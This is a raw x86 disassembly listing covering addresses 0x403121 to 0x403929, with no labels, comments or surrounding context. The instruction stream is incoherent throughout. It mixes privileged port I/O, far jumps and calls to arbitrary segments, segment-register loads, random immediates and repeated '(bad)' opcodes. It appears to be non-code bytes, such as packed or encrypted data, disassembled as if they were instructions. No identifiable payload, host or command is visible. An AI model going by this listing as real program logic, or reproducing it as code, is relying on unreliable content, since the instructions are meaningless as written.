  403121:	push   ds
  403122:	jg     0x40311a
  403124:	popfw  
  403126:	mov    ch,0x22
  403128:	jmp    0x2a7c:0xa043bbeb
  40312f:	xchg   ebx,eax
  403130:	clc    
  403131:	dec    DWORD PTR [ebx-0x24748ce6]
  403137:	add    al,0xcb
  403139:	std    
  40313a:	mov    ah,BYTE PTR [edi-0x13]
  40313d:	cmp    al,0x4
  40313f:	leave  
  403140:	dec    ebx
  403141:	out    dx,al
  403142:	or     al,bl
  403144:	push   0x9cdc8a25
  403149:	enter  0x5cb2,0x4a
  40314d:	sub    eax,0xb9b8bc
  403152:	inc    edx
  403153:	jmp    0x403185
  403155:	ror    BYTE PTR [ecx-0x2648405],cl
  40315b:	daa    
  40315c:	xor    DWORD PTR [ebp+0x75],ebx
  40315f:	xchg   ebx,eax
  403160:	cmp    eax,0x1ca4d5c0
  403165:	cmp    eax,0xad1f8153
  40316a:	mov    eax,ds:0x92fb001e
  40316f:	aas    
  403170:	cmp    al,0x76
  403172:	sahf   
  403173:	fdivrp st(6),st
  403175:	jge    0x403117
  403177:	sbb    al,0xd9
  403179:	dec    eax
  40317a:	mov    ds:0x967cd770,ax
  403180:	sbb    eax,0xf1c39f37
  403185:	scas   al,BYTE PTR es:[edi]
  403186:	push   es
  403187:	sub    eax,0xeaabb88d
  40318c:	sbb    BYTE PTR [ebx],ah
  40318e:	mov    ebx,0xe0a18a4
  403193:	jmp    0xb8c99b91
  403198:	pop    ecx
  403199:	out    0xef,al
  40319b:	mov    ds:0xc3696d25,eax
  4031a0:	cmp    DWORD PTR [eax],esp
  4031a2:	pop    ecx
  4031a3:	xor    ecx,esi
  4031a5:	pop    es
  4031a6:	and    BYTE PTR [eax],dh
  4031a8:	inc    edi
  4031a9:	repz cs mov cl,0xa5
  4031ad:	dec    ecx
  4031ae:	ja     0x403223
  4031b0:	scas   eax,DWORD PTR es:[edi]
  4031b1:	out    dx,eax
  4031b2:	and    BYTE PTR [ecx+0x30],bh
  4031b5:	das    
  4031b6:	push   ebx
  4031b7:	xchg   ecx,eax
  4031b8:	xor    BYTE PTR [edx],ah
  4031ba:	arpl   WORD PTR [esi-0x47c7826f],bp
  4031c0:	cmp    BYTE PTR [esi-0x664b8510],dl
  4031c6:	jecxz  0x4031d9
  4031c8:	jecxz  0x403174
  4031ca:	cmp    al,BYTE PTR [ecx+esi*1-0x6d]
  4031ce:	(bad)  
  4031cf:	xchg   ecx,eax
  4031d0:	push   eax
  4031d1:	jmp    0xd4bd:0x118061f
  4031d8:	jmp    0xa3c09fdf
  4031dd:	push   edi
  4031de:	and    ebx,ecx
  4031e0:	add    DWORD PTR [ebx-0x70],0xffffff8e
  4031e4:	out    0x6c,eax
  4031e6:	mov    edi,0x28189cfd
  4031eb:	pop    ebx
  4031ec:	adc    edi,DWORD PTR [edx-0x12715853]
  4031f2:	popa   
  4031f3:	xlat   BYTE PTR ds:[ebx]
  4031f4:	pop    eax
  4031f5:	mov    ds:0xa47d5bb9,al
  4031fa:	in     eax,dx
  4031fb:	ds and al,0xc3
  4031fe:	gs in  eax,dx
  403200:	cmp    eax,0x1426c69d
  403205:	and    al,0xb7
  403207:	or     eax,0xb1410477
  40320c:	jae    0x40322c
  40320e:	dec    esp
  40320f:	popf   
  403210:	xchg   BYTE PTR [esi+ebx*8+0x70993104],dh
  403217:	mov    ds:0x8518e0b,eax
  40321c:	in     eax,0x38
  40321e:	and    BYTE PTR [ecx],ah
  403220:	mov    cs,WORD PTR [ebp+0x2bfa12c5]
  403226:	push   es
  403227:	test   eax,0xc2266131
  40322c:	pop    eax
  40322d:	test   al,0xe1
  40322f:	add    dh,bh
  403231:	shl    DWORD PTR [edi],0xbd
  403234:	or     al,0x92
  403236:	or     al,BYTE PTR [ebx-0x58]
  403239:	lea    esp,[edx-0x10]
  40323c:	pop    ds
  40323d:	int3   
  40323e:	sbb    esp,DWORD PTR [ebx-0xe]
  403241:	mov    ebp,0x14df7e6f
  403246:	xor    edi,DWORD PTR [eax-0x7343caf7]
  40324c:	sub    eax,0x997d61f0
  403251:	or     BYTE PTR [ebp+0x1e197bd0],dl
  403257:	adc    BYTE PTR [edi],ch
  403259:	(bad)  
  40325a:	xchg   esp,eax
  40325b:	push   edi
  40325c:	sub    edx,DWORD PTR [esp+ecx*8]
  40325f:	mov    ebp,0xb21e93a4
  403264:	mov    ?,WORD PTR [edx]
  403266:	stos   BYTE PTR es:[edi],al
  403267:	aaa    
  403268:	addr16 std 
  40326a:	mov    ah,0xa2
  40326c:	lods   al,BYTE PTR ds:[esi]
  40326d:	inc    si
  40326f:	mov    esp,0x65b64f8b
  403274:	cld    
  403275:	add    eax,0x163f5754
  40327a:	nop
  40327b:	adc    cl,BYTE PTR ds:0xbc885c6c
  403281:	ret    
  403282:	or     ch,al
  403284:	sbb    DWORD PTR [edx-0x78cac10a],eax
  40328a:	inc    esi
  40328b:	mov    bl,0x88
  40328d:	push   edi
  40328e:	xchg   ebp,eax
  40328f:	arpl   sp,sp
  403291:	std    
  403292:	push   ss
  403293:	pop    esp
  403294:	ret    
  403295:	mov    bl,0x8f
  403297:	cs jno 0x40325d
  40329a:	popa   
  40329b:	sbb    DWORD PTR [esi+0x23],0xffffff80
  40329f:	into   
  4032a0:	push   cs
  4032a1:	or     dl,BYTE PTR [edx]
  4032a3:	mov    ah,BYTE PTR [edi+0x5312ab9d]
  4032a9:	iret   
  4032aa:	lods   eax,DWORD PTR fs:[esi]
  4032ac:	ss stos BYTE PTR es:[edi],al
  4032ae:	xchg   bx,ax
  4032b0:	push   ebp
  4032b1:	inc    esp
  4032b2:	mov    edx,edi
  4032b4:	or     BYTE PTR [esi+0x11],bl
  4032b7:	rcl    DWORD PTR [ecx-0x3f],1
  4032ba:	push   ds
  4032bb:	xchg   ebp,eax
  4032bc:	dec    edx
  4032bd:	arpl   WORD PTR [eax-0x8324c7d],sp
  4032c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032c4:	std    
  4032c5:	enter  0xf97a,0x6b
  4032c9:	mov    ch,0xc9
  4032cb:	inc    esp
  4032cc:	(bad)
  4032cf:	fisttp QWORD PTR [edx-0x1aae82f6]
  4032d5:	push   eax
  4032d6:	stos   BYTE PTR es:[edi],al
  4032d7:	jl     0x403275
  4032d9:	xor    eax,0x55722735
  4032de:	inc    edx
  4032df:	xor    BYTE PTR [esi+0x3fb504e4],cl
  4032e5:	push   0xffffff92
  4032e7:	in     al,0xb2
  4032e9:	push   esp
  4032ea:	ret    0xa164
  4032ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ee:	fwait
  4032ef:	loop   0x403309
  4032f1:	scas   eax,DWORD PTR es:[edi]
  4032f2:	fdivr  st,st(2)
  4032f4:	jmp    DWORD PTR [edx]
  4032f6:	out    dx,al
  4032f7:	shl    BYTE PTR [ebx],0x4f
  4032fa:	iret   
  4032fb:	in     eax,dx
  4032fc:	adc    DWORD PTR [ebp-0x469dc679],esp
  403302:	and    esp,DWORD PTR [edi-0xd1b7144]
  403308:	or     DWORD PTR [edi+0x46086f],edi
  40330e:	loopne 0x403323
  403310:	dec    ecx
  403311:	mov    esi,0xd05babad
  403316:	mov    al,ds:0x3a7b7206
  40331b:	jno    0x40333c
  40331d:	inc    ebp
  40331e:	mov    bl,0x23
  403320:	lahf   
  403321:	push   esi
  403322:	cli    
  403323:	jl     0x403396
  403325:	jno    0x4032ff
  403327:	inc    eax
  403328:	push   edi
  403329:	bound  edx,QWORD PTR ds:0x423fdbb0
  40332f:	test   DWORD PTR [edi],ecx
  403331:	sbb    DWORD PTR [eax+0x42],edx
  403334:	mov    al,ds:0xc6b3e1ae
  403339:	dec    edx
  40333a:	dec    ecx
  40333b:	stc    
  40333c:	iret   
  40333d:	pop    es
  40333e:	idiv   BYTE PTR [esi+0x4f]
  403341:	repz lds edi,FWORD PTR [edi+0x6eb76490]
  403348:	inc    ebx
  403349:	clc    
  40334a:	mov    al,ds:0x1828bc48
  40334f:	and    al,0x2a
  403351:	sbb    DWORD PTR ds:0xa7da6dcb,ebp
  403357:	outs   dx,BYTE PTR ds:[esi]
  403358:	dec    ebx
  403359:	leave  
  40335a:	(bad)  
  40335b:	leave  
  40335c:	nop
  40335d:	or     DWORD PTR [edi],0x1e099a72
  403363:	mov    ebx,DWORD PTR [ebp+0x67]
  403366:	cli    
  403367:	mov    cs,eax
  403369:	bound  ebx,QWORD PTR [ebp+0x40a3f5bb]
  40336f:	data16 test dh,ah
  403372:	repnz mov eax,ds:0x801531a3
  403378:	sub    DWORD PTR [ebx-0x54148f83],edi
  40337e:	test   eax,0x7553879a
  403383:	aaa    
  403384:	enter  0x47fe,0x8b
  403388:	cld    
  403389:	or     cl,BYTE PTR [eax+0x61]
  40338c:	aam    0x27
  40338e:	xchg   ebp,eax
  40338f:	mov    ecx,0x47c983f8
  403394:	pop    ebp
  403395:	adc    eax,0x3bb5e9f4
  40339a:	sbb    ah,dl
  40339c:	xchg   edi,eax
  40339d:	sbb    DWORD PTR [edi],0xffffff9c
  4033a0:	ror    DWORD PTR [edx-0x7c],cl
  4033a3:	daa    
  4033a4:	cmovs  ebx,DWORD PTR [edx]
  4033a7:	inc    esi
  4033a8:	shr    dh,cl
  4033aa:	jne    0x403381
  4033ac:	scas   eax,DWORD PTR es:[edi]
  4033ad:	aas    
  4033ae:	sub    eax,0x48c53c8
  4033b3:	adc    eax,ebx
  4033b5:	data16 mul BYTE PTR [ebp-0x1d9a4654]
  4033bc:	hlt    
  4033bd:	fcmovu st,st(2)
  4033bf:	or     esi,0xffffff85
  4033c2:	mov    esp,0xca56b1bc
  4033c7:	retf   0x94ed
  4033ca:	call   0x9ebf:0xb5bb0b9f
  4033d1:	iret   
  4033d2:	mov    ecx,esi
  4033d4:	dec    esp
  4033d5:	sti    
  4033d6:	xchg   ebx,eax
  4033d7:	in     eax,dx
  4033d8:	ss in  al,0xaf
  4033db:	test   eax,0xf769704a
  4033e0:	pushf  
  4033e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033e2:	adc    al,0xb5
  4033e4:	adc    BYTE PTR [edx],ah
  4033e6:	adc    DWORD PTR es:[eax+ecx*4-0x7e9d79d6],edi
  4033ee:	cs jmp 0x7c55ccad
  4033f4:	imul   edx,esi,0xffffff8c
  4033f7:	stc    
  4033f8:	add    al,0xc7
  4033fa:	dec    esp
  4033fb:	mov    al,ds:0xfa70663
  403400:	jbe    0x4033cb
  403402:	pop    eax
  403403:	mov    ebx,0x9cc9acd
  403408:	das    
  403409:	mov    bl,0x6f
  40340b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40340c:	repnz adc edx,DWORD PTR [ebp+0x3f]
  403410:	xor    BYTE PTR [ebx+0x76],bl
  403413:	sub    esp,DWORD PTR [esi+0x32e2809a]
  403419:	mov    al,ds:0x5bf43c78
  40341e:	stos   DWORD PTR es:[edi],eax
  40341f:	sbb    dh,dh
  403421:	mov    eax,ds:0x81d1e3e2
  403426:	es and al,0xe1
  403429:	loopne 0x4033b4
  40342b:	push   edi
  40342c:	cmp    BYTE PTR [eax+0xb],dh
  40342f:	inc    eax
  403430:	or     dl,bh
  403432:	pusha  
  403433:	cdq    
  403434:	sub    dh,bh
  403436:	sahf   
  403437:	sbb    DWORD PTR [bx+di-0x58],ecx
  40343b:	mov    cl,0xd3
  40343d:	sbb    eax,0x5995fd89
  403442:	fldcw  WORD PTR [edi]
  403444:	fs cli 
  403446:	xor    esp,DWORD PTR [esi+0x5e]
  403449:	xchg   ecx,eax
  40344a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40344b:	outs   dx,BYTE PTR ds:[esi]
  40344c:	or     eax,0x6fe7447c
  403452:	push   cs
  403453:	inc    edx
  403454:	pop    ecx
  403455:	repz dec esi
  403457:	lahf   
  403458:	ja     0x40345b
  40345a:	xor    DWORD PTR [ebx],0x783c1ca6
  403460:	push   edi
  403461:	cmp    DWORD PTR [ecx],0xc32560cd
  403467:	repz std 
  403469:	test   al,0x8a
  40346b:	loop   0x40349f
  40346d:	int3   
  40346e:	mov    ebx,0x447df09e
  403473:	imul   ebp,DWORD PTR [edx-0x79cfe7f],0xbcdb1dea
  40347d:	mov    dl,0xe5
  40347f:	lea    eax,[eax-0x5d3060db]
  403485:	sbb    BYTE PTR [ebp-0x62],ah
  403488:	or     ecx,DWORD PTR [esi-0x48]
  40348b:	jnp    0x403480
  40348d:	ins    BYTE PTR es:[edi],dx
  40348e:	pop    eax
  40348f:	and    DWORD PTR [eax-0x4f74302b],esp
  403495:	pop    ebp
  403496:	push   edx
  403497:	or     ah,bh
  403499:	bound  ebp,QWORD PTR [ebp+0x7ca42b54]
  40349f:	cmp    bh,BYTE PTR [esi+0x77]
  4034a2:	push   ecx
  4034a3:	lahf   
  4034a4:	hlt    
  4034a5:	bound  esi,QWORD PTR [edx+0x37c64824]
  4034ab:	outs   dx,DWORD PTR ds:[esi]
  4034ac:	in     al,dx
  4034ad:	jmp    0x62:0x24bc95e1
  4034b4:	xor    DWORD PTR [ebx],ecx
  4034b6:	repz shl dh,1
  4034b9:	les    esp,FWORD PTR [ebp+0x61]
  4034bc:	in     al,0xa7
  4034be:	iret   
  4034bf:	inc    esi
  4034c0:	mov    bh,0x25
  4034c2:	and    al,0x4c
  4034c4:	jno    0x40347a
  4034c6:	mov    ah,0x6d
  4034c8:	adc    cl,ah
  4034ca:	pop    ecx
  4034cb:	call   0x54c61781
  4034d0:	jmp    0x55d9:0xa41197eb
  4034d7:	addr16 add eax,0x3c067794
  4034dd:	jp     0x4034f8
  4034df:	sbb    BYTE PTR [edx-0x109c891a],dl
  4034e5:	cmp    dl,BYTE PTR [esi*2+0xe2a5b4d]
  4034ec:	ret    0x398c
  4034ef:	sbb    dl,al
  4034f1:	xor    al,0xf4
  4034f3:	mov    ds:0xfc3ba855,al
  4034f8:	or     dh,dh
  4034fa:	push   eax
  4034fb:	dec    esi
  4034fc:	add    BYTE PTR [ecx-0x77ceedcb],ah
  403502:	out    0x69,al
  403504:	int3   
  403505:	sub    eax,0x85cdaed0
  40350a:	or     edi,ecx
  40350c:	scas   al,BYTE PTR es:[edi]
  40350d:	jge    0x40355e
  40350f:	inc    edx
  403510:	(bad)  
  403511:	dec    esi
  403512:	je     0x4034c1
  403514:	sti    
  403515:	iret   
  403516:	test   al,0x52
  403518:	jno    0x403542
  40351a:	out    0xfa,eax
  40351c:	xchg   ecx,eax
  40351d:	stos   DWORD PTR es:[edi],eax
  40351e:	out    dx,al
  40351f:	dec    ecx
  403520:	cmc    
  403521:	lds    ecx,FWORD PTR [ebp-0x4fb016cb]
  403527:	jo     0x40351e
  403529:	or     BYTE PTR [esi-0x40],cl
  40352c:	adc    eax,0xaf0c5594
  403531:	pushf  
  403532:	xchg   ecx,eax
  403533:	add    DWORD PTR [esi-0xf],esp
  403536:	loopne 0x403506
  403538:	fwait
  403539:	into   
  40353a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40353b:	lods   al,BYTE PTR ds:[esi]
  40353c:	jmp    0x29f0b2bf
  403541:	mov    ch,0xf1
  403543:	lahf   
  403544:	in     al,0x6d
  403546:	xchg   esi,eax
  403547:	adc    bl,BYTE PTR [edx-0x2c33e471]
  40354d:	dec    ebp
  40354e:	mov    ch,0x96
  403550:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403552:	lds    edx,FWORD PTR [ebx-0x14bf00d3]
  403558:	in     eax,0xa7
  40355a:	lods   al,BYTE PTR ds:[esi]
  40355b:	rcr    DWORD PTR [eax],0xf9
  40355e:	fld    QWORD PTR [edx]
  403560:	rol    DWORD PTR [ecx+0x11e709b],0x73
  403567:	(bad)  
  403568:	push   esp
  403569:	enter  0xca90,0x7d
  40356d:	jne    0x403536
  40356f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403570:	mov    ds,WORD PTR [ecx-0x4c99912b]
  403576:	or     BYTE PTR [esi-0x30],bh
  403579:	out    dx,eax
  40357a:	pop    esp
  40357b:	sub    DWORD PTR [edx],ebx
  40357d:	mov    ah,0xa5
  40357f:	lea    edx,[ebp-0x7b]
  403582:	dec    ecx
  403583:	ror    esp,1
  403585:	int    0x6c
  403587:	and    BYTE PTR [edi],ch
  403589:	idiv   BYTE PTR [ebx]
  40358b:	push   0x2c2b7561
  403590:	pop    esp
  403591:	adc    al,0x33
  403593:	jle    0x4035ad
  403595:	jns    0x403542
  403597:	popf   
  403598:	xor    DWORD PTR [edi],edi
  40359a:	(bad)  [edx-0x7a2eeb7e]
  4035a0:	cli    
  4035a1:	push   es
  4035a2:	call   esi
  4035a4:	ins    BYTE PTR es:[edi],dx
  4035a5:	outs   dx,BYTE PTR ds:[esi]
  4035a6:	aad    0x85
  4035a8:	push   ss
  4035a9:	bound  ax,DWORD PTR [edi]
  4035ac:	cs and eax,0xd5f51657
  4035b2:	lea    edi,[edx]
  4035b4:	mov    dh,0xbb
  4035b6:	cmovge edx,DWORD PTR [eax+0x64]
  4035ba:	fnstenv [eax+ebp*1+0x21d2407a]
  4035c1:	xchg   ecx,eax
  4035c2:	adc    eax,0x964c9bae
  4035c7:	dec    ebp
  4035c8:	cmp    BYTE PTR [edi-0x5b],0xcc
  4035cc:	xchg   ecx,eax
  4035cd:	(bad)  
  4035cf:	push   edx
  4035d0:	and    al,0xb8
  4035d2:	jg     0x403599
  4035d4:	repz sbb DWORD PTR [edx],ebp
  4035d7:	mov    eax,ds:0xcb4750a
  4035dc:	mov    edi,0x8f3015ef
  4035e1:	xor    eax,0xeaf94a83
  4035e6:	sub    bh,bh
  4035e8:	xor    BYTE PTR [ebx],bh
  4035ea:	and    BYTE PTR ds:[ebx+esi*4+0x24],cl
  4035ef:	rcr    BYTE PTR [ecx+ebp*8],1
  4035f2:	das    
  4035f3:	jnp    0x40359f
  4035f5:	pushf  
  4035f6:	outs   dx,DWORD PTR ds:[esi]
  4035f7:	test   al,0xc
  4035f9:	jle    0x4035e7
  4035fb:	or     eax,0x8479c1d8
  403600:	es jp  0x4035d8
  403603:	xor    dl,BYTE PTR ds:0xf08e15ed
  403609:	pop    eax
  40360a:	out    0x18,al
  40360c:	sub    al,0x57
  40360e:	cmp    DWORD PTR [esp+ebp*1],ebx
  403611:	rcl    ah,cl
  403613:	add    eax,0xc3c1e5c8
  403618:	lock sub DWORD PTR [ebx],edx
  40361b:	jnp    0x40366e
  40361d:	xchg   BYTE PTR [ebx+0xe3d4472],ch
  403623:	add    BYTE PTR [esi+0x59bada72],al
  403629:	or     DWORD PTR [edi],ebp
  40362b:	test   eax,0xc04a30d2
  403630:	jnp    0x403643
  403632:	xchg   ecx,eax
  403633:	lock push eax
  403635:	mul    BYTE PTR ds:0x3c2eef49
  40363b:	ss adc al,0xd8
  40363e:	cmp    DWORD PTR [esi+0x79],0xd492b56a
  403645:	fild   QWORD PTR [ebp+0x24]
  403648:	sub    eax,0x6a5702e7
  40364d:	mov    ebx,0x218c833e
  403652:	leave  
  403653:	inc    ebx
  403654:	dec    esp
  403655:	mov    eax,ds:0x8cf06a85
  40365a:	sub    DWORD PTR [edx],esp
  40365c:	sub    al,BYTE PTR [ecx+0x6e]
  40365f:	mov    bl,0x7c
  403661:	inc    ecx
  403662:	fcomp  DWORD PTR [eax]
  403664:	push   ds
  403665:	scas   al,BYTE PTR es:[edi]
  403666:	out    0x3b,al
  403668:	add    BYTE PTR [ebp-0x2b],cl
  40366b:	fistp  DWORD PTR [eax]
  40366d:	sub    DWORD PTR [ecx],esi
  40366f:	sub    eax,0x7bd1c1f7
  403674:	cmp    DWORD PTR [esi+0x2a],ebx
  403677:	ss pop ss
  403679:	adc    eax,DWORD PTR [edi+0x3b]
  40367c:	jl     0x403618
  40367e:	out    dx,al
  40367f:	mov    edx,DWORD PTR [bx]
  403682:	in     eax,0x17
  403684:	sbb    al,0x3
  403686:	test   ebp,ebp
  403688:	fsubr  QWORD PTR [esi+0x65]
  40368b:	nop
  40368c:	cld    
  40368d:	stos   BYTE PTR es:[edi],al
  40368e:	ja     0x40361a
  403690:	call   0x18b4:0xda28647d
  403697:	mov    ecx,DWORD PTR [esi-0x3c899773]
  40369d:	mov    ebp,0x16b75b6d
  4036a2:	retf   
  4036a3:	pop    ss
  4036a4:	daa    
  4036a5:	dec    ebx
  4036a6:	stos   BYTE PTR es:[edi],al
  4036a7:	jp     0x40366c
  4036a9:	xor    eax,0x32fe67f0
  4036ae:	clc    
  4036af:	test   DWORD PTR [eax],eax
  4036b1:	les    edx,FWORD PTR [ebx-0x1b]
  4036b4:	mov    bl,0xdb
  4036b6:	stos   BYTE PTR es:[edi],al
  4036b7:	fsub   DWORD PTR [edi+0x9]
  4036ba:	mov    ah,0x31
  4036bc:	sbb    ebx,DWORD PTR [edx]
  4036be:	les    esp,FWORD PTR [ecx*2+0xcde4773]
  4036c5:	mov    dl,0x21
  4036c7:	adc    esp,DWORD PTR [ebx]
  4036c9:	aad    0x80
  4036cb:	pop    edx
  4036cc:	cwde   
  4036cd:	cmp    al,0x88
  4036cf:	jmp    0x29e44b3
  4036d4:	test   al,0x10
  4036d6:	xor    eax,0x1f68e0ad
  4036db:	pushf  
  4036dc:	push   edi
  4036dd:	mov    DWORD PTR [ebp+0x55],ebp
  4036e0:	push   esp
  4036e1:	daa    
  4036e2:	xchg   esp,eax
  4036e3:	mov    dl,0xf4
  4036e5:	sbb    BYTE PTR [esi],0x72
  4036e8:	cli    
  4036e9:	call   0x7a0ee2b7
  4036ee:	fbstp  TBYTE PTR [esi]
  4036f0:	dec    esi
  4036f1:	push   edi
  4036f2:	test   DWORD PTR [eax-0x61],eax
  4036f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f6:	out    0xa2,eax
  4036f8:	sub    eax,0xc376c771
  4036fd:	cmp    edx,DWORD PTR [eax]
  4036ff:	adc    ch,BYTE PTR [ebx-0x1f36e84a]
  403705:	or     DWORD PTR [esi],ebp
  403707:	clc    
  403708:	(bad)
  40370b:	mov    BYTE PTR [ecx],bh
  40370d:	add    dl,0x2f
  403710:	rol    DWORD PTR [esi-0x75],0xe0
  403714:	inc    esp
  403715:	and    eax,0x23fa02e2
  40371a:	ss sbb edi,ebp
  40371d:	outs   dx,DWORD PTR ds:[esi]
  40371e:	xchg   edi,eax
  40371f:	inc    ecx
  403720:	or     DWORD PTR ds:0x1e9043a4,esi
  403726:	or     al,dl
  403728:	mov    ds:0xfbbeaea6,al
  40372d:	imul   eax,DWORD PTR [ebp+0x7aeb2fee],0xf
  403734:	fs dec edi
  403736:	mov    bh,0x92
  403738:	pop    es
  403739:	(bad)  
  40373a:	mov    ebp,0xda436e27
  40373f:	les    ebp,FWORD PTR [edi-0x2d]
  403742:	fbstp  TBYTE PTR [edi-0x27217ac4]
  403748:	js     0x40376c
  40374a:	fild   QWORD PTR [eax+0x66]
  40374d:	adc    bl,BYTE PTR [edx+0x95ae75b]
  403753:	test   eax,0xbbdc1f6e
  403758:	ins    BYTE PTR es:[edi],dx
  403759:	test   BYTE PTR ss:[edi],dh
  40375c:	enter  0xaa4e,0x68
  403760:	ja     0x4037aa
  403762:	sbb    BYTE PTR [esi+0x67e9c55d],ch
  403768:	dec    ebx
  403769:	xchg   ecx,eax
  40376a:	fisubr DWORD PTR [esp+ebx*2+0x3b]
  40376e:	sahf   
  40376f:	pusha  
  403770:	ss je  0x4037dc
  403773:	test   DWORD PTR [eax],ebp
  403775:	pop    ecx
  403776:	cld    
  403777:	add    ah,BYTE PTR [eax]
  403779:	mov    ebp,0xf8c6efa
  40377e:	retf   
  40377f:	lahf   
  403780:	xchg   edx,eax
  403781:	mov    al,ds:0x63fdd17f
  403786:	sbb    al,0x52
  403788:	retf   0x9c06
  40378b:	adc    cl,BYTE PTR [ecx]
  40378d:	aaa    
  40378e:	jne    0x4037d6
  403790:	lods   al,BYTE PTR ds:[esi]
  403791:	fnsave [esi]
  403793:	jne    0x40371d
  403795:	adc    BYTE PTR [ebp+0x5c],ah
  403798:	fs inc edi
  40379a:	rcr    DWORD PTR [edx],0xf5
  40379d:	mov    dh,0x28
  40379f:	jmp    0x403747
  4037a1:	in     eax,0xb1
  4037a3:	sbb    dh,BYTE PTR [edi+0x25be8467]
  4037a9:	mov    eax,DWORD PTR [edx+0x18]
  4037ac:	(bad)  
  4037ad:	sar    BYTE PTR [edi+0x1e6b1873],0xdf
  4037b4:	ss inc esi
  4037b6:	inc    edi
  4037b7:	xchg   bl,dl
  4037b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037ba:	and    al,0xac
  4037bc:	int    0x49
  4037be:	fwait
  4037bf:	dec    edi
  4037c0:	push   esi
  4037c1:	pop    ecx
  4037c2:	pop    eax
  4037c3:	rcl    edx,1
  4037c5:	sbb    eax,0xfd31ebd2
  4037ca:	xor    BYTE PTR [edi-0x3df98bfe],0x16
  4037d1:	mov    ch,0xde
  4037d3:	jmp    0x403851
  4037d5:	sub    DWORD PTR [edx-0x68115b82],ecx
  4037db:	imul   eax,DWORD PTR [edi],0xffffffba
  4037de:	jl     0x4037dc
  4037e0:	inc    edi
  4037e1:	test   eax,0xfb20f6b3
  4037e6:	into   
  4037e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037e8:	xchg   DWORD PTR [edi-0x39],esp
  4037eb:	out    dx,al
  4037ec:	in     eax,dx
  4037ed:	sar    ebx,0x5b
  4037f0:	outs   dx,DWORD PTR ds:[esi]
  4037f1:	(bad)  
  4037f2:	ror    DWORD PTR [eax+0x5971684b],0xfb
  4037f9:	enter  0xa726,0xb1
  4037fd:	push   ebp
  4037fe:	call   0x6cf2:0x43428040
  403805:	jg     0x40384a
  403807:	adc    edi,eax
  403809:	js     0x403838
  40380b:	dec    ebp
  40380c:	sbb    eax,0xbb16e65f
  403811:	gs sub eax,0x3783f9bf
  403817:	pop    esi
  403818:	sbb    eax,0x3e19d42e
  40381d:	pop    eax
  40381e:	pop    es
  40381f:	adc    ecx,ecx
  403821:	and    ebx,DWORD PTR [eax-0x276fd250]
  403827:	leave  
  403828:	cmp    al,0x49
  40382a:	ffreep st(3)
  40382c:	pop    ds
  40382d:	in     al,0x99
  40382f:	pop    eax
  403830:	(bad)  [esi-0xa5b2b07]
  403836:	(bad)  
  403837:	push   esp
  403838:	pop    esp
  403839:	imul   BYTE PTR [esi]
  40383b:	push   ds
  40383c:	shr    BYTE PTR [esi+0x691962bb],1
  403842:	push   ebp
  403843:	inc    esi
  403844:	cli    
  403845:	cld    
  403846:	cmp    eax,0x21900785
  40384b:	stos   BYTE PTR es:[edi],al
  40384c:	jbe    0x40380b
  40384e:	push   0xed1cf93d
  403853:	mov    edi,0xeb1280ad
  403858:	push   edx
  403859:	stos   DWORD PTR es:[edi],eax
  40385a:	xchg   edi,eax
  40385b:	fild   DWORD PTR [edx-0x6d]
  40385e:	xchg   ebp,edx
  403860:	adc    DWORD PTR [eax-0x136726a0],edi
  403866:	dec    ebx
  403867:	ds ins DWORD PTR es:[edi],dx
  403869:	jbe    0x4038aa
  40386b:	xor    ch,bl
  40386d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40386e:	je     0x40388f
  403870:	fistp  DWORD PTR [ebx-0x62]
  403873:	pop    esp
  403874:	xchg   ebp,eax
  403875:	jo     0x4038af
  403877:	sbb    eax,0x5998309c
  40387c:	mov    ds:0x5893e255,eax
  403881:	jno    0x403829
  403883:	fisttp DWORD PTR [edi+0x5fb57e7c]
  403889:	and    eax,0xa0b8f770
  40388e:	sub    BYTE PTR [ecx+0x34ffaf25],bl
  403894:	adc    BYTE PTR [edx],cl
  403896:	ret    
  403897:	inc    edi
  403898:	cmp    BYTE PTR [ecx],ah
  40389a:	mov    WORD PTR [edx],si
  40389d:	stos   DWORD PTR es:[edi],eax
  40389e:	sub    ah,BYTE PTR [edi+0x636dc672]
  4038a4:	add    al,0xfa
  4038a6:	mov    ebp,0xa23bb544
  4038ab:	rdpmc  
  4038ad:	mov    ds:0x88849996,eax
  4038b2:	ins    DWORD PTR es:[edi],dx
  4038b3:	adc    eax,0xd74fd35b
  4038b8:	or     eax,0xd972ec93
  4038bd:	sahf   
  4038be:	adc    al,0xc2
  4038c0:	retf   
  4038c1:	pop    esi
  4038c2:	retf   
  4038c3:	in     al,dx
  4038c4:	mov    esp,DWORD PTR [edi+0x71]
  4038c7:	sub    BYTE PTR [edx],0xa8
  4038ca:	add    eax,0x5b0b3803
  4038cf:	jmp    0x37fe:0x271f2b7c
  4038d6:	mov    cl,0xb3
  4038d8:	xchg   esi,eax
  4038d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038da:	(bad)  
  4038db:	imul   edx,DWORD PTR [ecx],0xe52df3fa
  4038e1:	repz sub edx,DWORD PTR [eax+ebp*1]
  4038e5:	cmc    
  4038e6:	adc    al,0x2b
  4038e8:	imul   eax,DWORD PTR [esi],0x36
  4038eb:	in     al,0x5e
  4038ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038ee:	xor    DWORD PTR [ecx+0xd],0x5c0e16c8
  4038f5:	jle    0x40387b
  4038f7:	add    BYTE PTR [eax-0x2d],bl
  4038fa:	jge    0x40387e
  4038fc:	(bad)  
  4038fd:	iret   
  4038fe:	fdivr  DWORD PTR [edi+0x22288da4]
  403904:	push   cs
  403905:	jle    0x403900
  403907:	sbb    BYTE PTR [esi+0x73],0x3c
  40390b:	mov    edi,0xc075e24a
  403910:	call   0x2b66:0xdb0a5f6
  403917:	cmp    DWORD PTR ds:0xa871a7b0,0xfffffff3
  40391e:	leave  
  40391f:	call   0x177d:0x143bc527
  403926:	bnd jo 0x4038a9
  403929:	push   edi
